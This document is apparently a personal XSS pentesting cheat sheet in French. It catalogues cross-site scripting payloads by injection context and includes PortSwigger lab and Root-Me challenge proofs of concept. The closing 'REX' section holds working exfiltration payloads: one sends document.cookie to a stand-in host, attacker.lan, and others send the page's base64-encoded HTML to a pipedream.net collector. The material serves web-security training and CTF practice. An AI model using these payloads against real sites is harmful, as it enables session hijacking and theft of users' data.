# XSS

1. Use SecList https://github.com/danielmiessler/SecLists/tree/master/Fuzzing to find more payload
2. Burp ressources: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
3. Lorsque des caractères sont filtrés: utiliser le fuzzer ZAP, le BURP intruder ou Ffuf pour tester les balises et les payload petit à petit j'usqu'a avoir des réponses 200 avec chars non-encodés
4. regarder dans le debugger du navigateur: "inspect element" et onglet "source"

## Basics 

## complément XSS

Trois cas d’usage où une faille XSS peut être identifiée :
Le paramètre est repris au milieu d’une balise HTML, Il est alors nécessaire d’avoir les chevrons non encodés afin d’exploiter cette faille

```js
<script>alert(0)</script>
```

Le paramètre est repris au milieu d’un paramètre d’une balise HTML, il est alors nécessaire d’avoir les guillemets non encodés afin d’exploiter cette faille

```js
onready="alert(0)
```

Le paramètre est repris au sein d’une balise script, il est alors nécessaire d’avoir l’un de ces caractères selon le contexte : ', "  ou ;

```js
'; alert(0); //
```

# types

## Reflected + Stored

```js
<script>alert(0)</script>
<img src=1 onerror=alert(1)>
<a href="javascript:alert(document.domain)">Click Me</a>
```

parfois il faut jouer avec les "quotes":

```js
"onmouseover="alert(0)'
```

éxecutera: 

```js
name=search value=""onmouseover="alert(0)">
```

Quand la saisie réapparait dans un href, on insert directement le code JS:

```js
javascript:alert(document.domain)
```

Si la saisie réapparait dans du code JS, on ferme la quote ' et utilise le signe moins - ou + pour concat:

```js
'+alert(document.cookie)+'
```

## DOM

```js
"><script>alert(document.domain)</script>
"><img src=1 onerror=alert(document.domain)>
```

### jQuery + manipulation url


```js
?returnUrl=javascript:alert(document.domain)
```

### AngularJS + ng-app attribute

```js
{{constructor.constructor('alert(1)')()}}
```

### in xhr

```js
\"-alert(1)}//
```

## POC depuis un iframe

```js
<iframe src="https://ace11f3f1fe0965980b4432a00d900b0.web-security-academy.net/?earch=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='1000px'>" onload=this.style.width='1000px'>
```

## custom ID (from malicious server)

```js
<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

## REX

exemple paload pour vol de cookie (DOM based): 

```
test';document.location="https://attacker.lan?c="+document.cookie;'
```


Online et vol du contenu la page web:

```
<img src=x onerror="document.location=`//en5048oeg59ha.x.pipedream.net?c=${btoa(document.body.innerHTML)}`">
```
ou
```
<svg onload='window.location.href="//en5048oeg59ha.x.pipedream.net?content=".concat(document.getElementsByTagName("p")[0].innerHTML.split(" ")[39])'>
```

(payload rootme: http://challenge01.root-me.org:58008/page?user=<img src=x onerror="document.location=`//en5048oeg59ha.x.pipedream.net?c=${btoa(document.body.innerHTML)}`">  )


